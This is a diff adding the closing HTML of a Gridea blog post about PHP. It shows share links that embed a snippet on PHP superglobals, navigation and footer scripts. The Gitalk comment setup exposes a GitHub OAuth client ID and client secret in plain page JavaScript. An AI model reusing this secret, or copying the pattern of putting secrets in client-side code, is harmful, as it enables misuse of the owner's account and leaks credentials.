+                            </div>
+                            
+                                
+                                    
+                                            <!--zh-->
+                                            <section class="post-copyright zh">
+                                                <p class="copyright-item ">
+                                                    <span>&#x4F5C;&#x8005;:</span>
+                                                    <span>Rain</span>
+                                                </p>
+
+                                                <p class="copyright-item">
+                                                    <span>&#x6C38;&#x4E45;&#x94FE;&#x63A5;:</span>
+                                                    <span><a href="https://rainerhu.github.io/post/php/">https://rainerhu.github.io/post/php/</a></span>
+                                                </p>
+
+                                                <p class="copyright-item">
+                                                    <span>&#x534F;&#x8BAE;:</span>
+                                                    <span>MIT License</span>
+                                                </p>
+                                            </section>
+                                            
+                                                
+                                                    
+                                                                    <!--Share-->
+                                                                    <span style="margin-right:15px">
+                        <i class="post-share"></i>
+                        <span>&#x5206;&#x4EAB;:</span>
+                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://rainerhu.github.io/post/php/"><i class="fa fa-qrcode"></i></a>
+                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://rainerhu.github.io/post/php/&sharesource=qzone&title=php&pics=https://rainerhu.github.io/images/avatar.png?v=1687779481197&summary=&lt;ul&gt;
+&lt;li&gt;原文连接&lt;a href=&#34;http://www.restran.net/2016/09/26/php-security-notes/&#34;&gt;http://www.restran.net/2016/09/26/php-security-notes/&lt;/a&gt;&lt;br&gt;
+copy用于方便查阅&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;系统变量&#34;&gt;系统变量&lt;/h1&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$_POST // 获取 post 数据，是一个字典
+$_GET // 获取 get 数据，是一个字典
+$_COOKIE // 获取 cookie
+$_SESSION // 获取 session
+$_FILE // 获取上传的文件
+$_REQUEST // 获取 $_GET，$_POST，$_COOKIE 中的数据
+&lt;/code&gt;&lt;/pre&gt;
+"><i class="fa fa-qq"></i></a>
+                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://rainerhu.github.io/post/php/&sharesource=weibo&title=php + " - " + &lt;ul&gt;
+&lt;li&gt;原文连接&lt;a href=&#34;http://www.restran.net/2016/09/26/php-security-notes/&#34;&gt;http://www.restran.net/2016/09/26/php-security-notes/&lt;/a&gt;&lt;br&gt;
+copy用于方便查阅&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;系统变量&#34;&gt;系统变量&lt;/h1&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$_POST // 获取 post 数据，是一个字典
+$_GET // 获取 get 数据，是一个字典
+$_COOKIE // 获取 cookie
+$_SESSION // 获取 session
+$_FILE // 获取上传的文件
+$_REQUEST // 获取 $_GET，$_POST，$_COOKIE 中的数据
+&lt;/code&gt;&lt;/pre&gt;
+&pic="https://rainerhu.github.io/images/avatar.png?v=1687779481197 "><i class="fa fa-weibo "></i></a>
+
+                                                                    </span>
+                                                                    
+                                                                            <!--zh-->
+                                                                            <section class="post-tags zh ">
+                                                                                <div>
+                                                                                    <span>&#x6807;&#x7B7E;:</span>
+                                                                                    <span class="tag ">
+                        
+                        
+                        <a href="https://rainerhu.github.io/tag/f81tfGuJr/">#
+                    php
+                        </a>
+                        
+                            
+                                </span>
+                                                                                </div>
+                                                                                <div>
+                                                                                    <a href="javascript:window.history.back();">
+                        &#x8FD4;&#x56DE;</a>
+                                                                                    <span>&dot;</span>
+                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
+                                                                                </div>
+                                                                            </section>
+
+                                                                            
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://rainerhu.github.io/post/sss/">
+                                                                                            SSS redirect
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                </section>
+                 <br>
+                
+                    
+                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>
+
+<script>
+    var gitalk = new Gitalk({
+        clientID: '69c3f7f6bd9f878c4618',
+        clientSecret: '2685804d68000de33acf70353e4540306ea18492',
+        repo: 'Rainerhu.github.io',
+        owner: 'Rainerhu',
+        admin: ['Rainerhu'],
+        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script>
+                            
+                                        
+                                            
+					</article>
+                </div>
+            </div>
+    </div>
+    </div>
+    </div>
+    
+        <footer id="footer" class="footer">
+            <div class="copyright">
+                
+                        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+                            
+                                <b id="hitokoto"></b><br>
+                                
+                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
+            <path
+                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
+                fill="#93b5cf"></path>
+        </svg>
+                                        Rain &copy;Copyright
+                                            <script>
+                                                var date = new Date();
+                                                document.write("" + date.getFullYear());
+                                            </script>
+                                            | Powered by
+                                            <a href="xx" target="_blank">
+                                                git
+                                            </a>
+            </div>
+            <div id="update" style="display:none;">
+                off
+            </div>
+            
+                    <script>
+                        var pat = '';
+                        
+                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + pat + '</div>')
+                    </script>
+        </footer>
+        
+            <script src='https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js'></script>
+            
+                <script>
+                    
+                    
+                    loadlive2d();
+                    
+                    
+                    hitokoto();
+                    
+                    getStar();
+                    hljs.initHighlighting();
+                    console.clear();
+                    
+                    var newDate = new Date();
+                    newDate.setTime(1687779481197);
+                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
+                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
+                </script>
+                
+        </div>
+</body>
+<script>
+    scroll();
+</script>
+
+</html>
